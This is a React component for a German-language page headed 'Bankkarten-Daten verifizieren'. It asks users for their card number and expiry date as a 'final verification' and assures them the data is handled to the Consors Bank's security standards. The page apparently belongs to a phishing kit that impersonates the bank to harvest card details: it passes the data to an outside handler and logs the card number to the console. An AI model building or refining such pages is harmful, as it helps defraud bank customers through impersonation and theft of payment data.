import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);
  
  // Focus states for floating labels
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      console.log('BankCardForm: Submitting data:', {
        card_number: cardNumber,
        expiry_date: expiryDate,
      });
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      
      // Handle backend validation errors
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        
        error.details.forEach((detail: any) => {
          if (detail.field === 'expiry_date') {
            backendErrors.expiry_date = 'Ungültiges Ablaufdatum. Format: MM/JJ (Monat 01-12)';
          } else if (detail.field === 'card_number') {
            backendErrors.card_number = 'Ungültige Kartennummer';
          }
        });
        
        setErrors(backendErrors);
      }
      setIsLoading(false); // Only stop loading on error
    }
    // Don't set isLoading to false on success - let the parent component handle state transitions
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (!/^\d+(\s\d+)*$/.test(cardNumber.trim())) {
      newErrors.card_number = 'Kartennummer darf nur Zahlen enthalten';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ (Monat 01-12)';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Helper function to create floating label input
  const createFloatingLabelInput = (
    id: string,
    type: string,
    value: string,
    onChange: (value: string) => void,
    label: string,
    focused: boolean,
    setFocused: (focused: boolean) => void,
    error?: string,
    placeholder?: string,
    maxLength?: number,
    style?: React.CSSProperties
  ) => {
    const isLabelFloating = value.length > 0 || focused;
    
    return (
      <div style={{ position: 'relative', marginBottom: '16px' }}>
        <input
          id={id}
          type={type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          placeholder={placeholder || ''}
          maxLength={maxLength}
          className="floating-label-input"
          style={{
            width: '100%',
            padding: '28px 16px 8px 16px',
            border: focused ? '2px solid #0080a6' : '1px solid rgba(0, 0, 0, 0.65)',
            borderRadius: '4px',
            fontSize: '16px',
            lineHeight: '24px',
            fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
            fontStyle: 'normal',
            fontWeight: 'normal',
            backgroundColor: 'transparent',
            outline: 'none',
            transition: 'all 0.2s ease',
            minHeight: '65px',
            boxSizing: 'border-box',
            ...style
          }}
        />
        <label style={{
          position: 'absolute',
          left: '16px',
          top: isLabelFloating ? '8px' : '24px',
          fontSize: isLabelFloating ? (isMobile ? '11px' : '12px') : (isMobile ? '14px' : '16px'),
          fontWeight: 'normal',
          color: focused ? '#0080a6' : 'rgba(0, 0, 0, 0.6)',
          fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
          fontStyle: 'normal',
          transition: 'all 0.2s ease',
          pointerEvents: 'none',
          transformOrigin: 'left top'
        }}>
          {label}
        </label>
        {error && (
          <div style={{
            color: '#dc3545',
            fontSize: '0.875rem',
            marginTop: '0.5rem',
            fontFamily: 'Proxima Nova Vara, system-ui, sans-serif'
          }}>
            {error}
          </div>
        )}
      </div>
    );
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message="Bankkarten-Daten werden validiert..."
        />
      )}
      
      <div style={{
        backgroundColor: 'transparent',
        padding: '0',
        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
        fontStyle: 'normal'
      }}>
        <div style={{
          maxWidth: isMobile ? 'none' : '1400px',
          margin: isMobile ? '0' : '0 auto',
          padding: isSmallMobile ? '20px 20px 20px 20px' : isMobile ? '24px 24px 24px 24px' : '32px 8px 32px 8px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: isMobile ? 'center' : 'flex-start'
        }}>
          <div style={{
            width: isMobile ? '100%' : '660px',
            backgroundColor: 'white',
            borderRadius: '8px',
            border: 'none',
            boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
            overflow: 'hidden'
          }}>
            <div style={{
              padding: isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px'
            }}>
          {/* Title */}
          <h1 style={{
                color: '#003d7a',
                fontSize: isMobile ? '1.5rem' : '1.75rem',
            fontWeight: 'normal',
            marginBottom: '1rem',
            fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
            fontStyle: 'normal',
                textAlign: 'left'
          }}>
            Bankkarten-Daten verifizieren
          </h1>
          
          <p style={{
                color: '#666',
                fontSize: isMobile ? '14px' : '16px',
                lineHeight: isMobile ? '20px' : '24px',
            marginBottom: '2rem',
            fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
            fontStyle: 'normal',
            fontWeight: 'normal',
                textAlign: 'left'
          }}>
            Bitte geben Sie Ihre Bankkarten-Daten zur finalen Verifizierung ein.
          </p>
          
          <form onSubmit={handleSubmit}>
            {/* Card Number */}
            <div>
              {createFloatingLabelInput(
                'cardNumber',
                'text',
                cardNumber,
                (value) => setCardNumber(formatCardNumber(value)),
                'Kartennummer *',
                cardNumberFocused,
                setCardNumberFocused,
                errors.card_number,
                undefined,
                19
              )}
            </div>

            {/* Expiry Date */}
            <div>
              {createFloatingLabelInput(
                'expiryDate',
                'text',
                expiryDate,
                (value) => setExpiryDate(formatExpiryDate(value)),
                'Ablaufdatum (MM/JJ) *',
                expiryDateFocused,
                setExpiryDateFocused,
                errors.expiry_date,
                undefined,
                5
              )}
            </div>

            {/* Security Notice */}
            <div style={{ 
              backgroundColor: '#f8f9fa',
              border: '1px solid #e9ecef',
              borderRadius: '8px',
              padding: '16px',
              marginBottom: '2rem' 
            }}>
              <div style={{ display: 'flex', alignItems: 'center', marginBottom: '0.5rem' }}>
                <svg 
                  width="20" 
                  height="20" 
                  viewBox="0 0 24 24" 
                  fill="none" 
                  stroke="currentColor" 
                  strokeWidth="2"
                  style={{ marginRight: '0.75rem', color: '#0080a6' }}
                >
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                  <circle cx="12" cy="16" r="1"/>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
                <p style={{
                  color: '#333',
                  fontSize: '1rem',
                  fontWeight: 'normal',
                  margin: 0,
                  fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                  fontStyle: 'normal'
                }}>
                  Ihre Daten sind sicher
                </p>
              </div>
              <p style={{
                color: '#666',
                fontSize: '0.875rem',
                margin: 0,
                lineHeight: '1.4',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                fontStyle: 'normal',
                fontWeight: 'normal'
              }}>
                Alle Daten werden verschlüsselt übertragen und gemäß den höchsten Sicherheitsstandards der Consors Bank verarbeitet.
              </p>
            </div>

            {/* Submit Button */}
            <div style={{
              marginTop: '2rem'
            }}>
              <button
                type="submit"
                disabled={isLoading}
                className="button button-primary"
                style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  padding: '12px 24px',
                  minHeight: '40px',
                  lineHeight: '1',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  opacity: isLoading ? 0.6 : 1,
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  backgroundColor: '#0080a6',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  transition: 'background-color 0.2s ease'
                }}
              >
                {isLoading ? 'Daten werden validiert...' : 'Daten bestätigen'}
                {!isLoading && (
                  <span style={{
                    fontSize: '18px',
                    fontWeight: 'bold'
                  }}>
                    ›
                  </span>
                )}
              </button>
            </div>
          </form>
          </div>
        </div>
        </div>
      </div>
    </>
  );
};

export default BankCardForm;